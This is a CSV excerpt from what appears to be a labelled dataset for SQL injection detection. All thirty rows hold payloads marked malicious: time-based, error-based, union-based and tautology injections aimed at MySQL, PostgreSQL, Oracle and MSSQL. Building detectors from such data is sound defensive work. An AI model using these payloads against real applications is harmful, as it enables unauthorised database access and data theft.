row_index,payload_norm,label,sqli_type_hint
1050,"1"" ) where 6897 = 6897",1,
1051,"1"" where 7739 = 7739 and sleep ( 5 ) --",1,
1052,"1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
1053,"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""nbfe"" = ""nbfe",1,
1054,"1"" ) ) as osuh where 8809 = 8809",1,
1055,"1'|| ( select 'ftey' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",1,
1056,"1' where 7104 = 7104 union all select null,null,null,null,null,null,null#",1,
1057,1%' order by 1#,1,
1058,"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""nwzu"" like ""nwzu",1,
1059,select ( case when ( 6961 = 7460 ) then 1 else 6961* ( select 6961 from master..sysdatabases ) end ) --,1,
1060,select ( case when ( 3676 = 8635 ) then 3676 else 1/ ( select 0 ) end ) --,1,
1061,"1%"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
1062,-5137 ) or 9323 = 9323#,1,
1063,"-1184"" ) ) ) union all select 1482--",1,
1064,"-6158"" ) union all select 3084,3084,3084,3084,3084,3084#",1,
1065,"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""hkjm"" like ""hkjm",1,
1066,1 ) as gbtj where 8175 = 8175,1,
1067,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'mwyu' = 'mwyu",1,
1068,1 ) as lisg where 5490 = 5490,1,
1069,"1 ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
1070,"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'dpdz' like 'dpdz",1,
1071,"1 where 3902 = 3902 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
1072,"-9859"" ) ) ) union all select 6595,6595,6595,6595,6595,6595,6595#",1,
1073,"1"" ) as xylo where 2112 = 2112 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
1074,"1' where 8749 = 8749 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1075,"1'|| ( select 'oyyu' where 6765 = 6765 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",1,
1076,-3100' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'etuj' like 'etuj,1,
1077,"-2319 union all select 5068,5068,5068#",1,
1078,"-6095"" ) as hygc where 8142 = 8142 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
1079,"-9656"" union all select 8735,8735--",1,
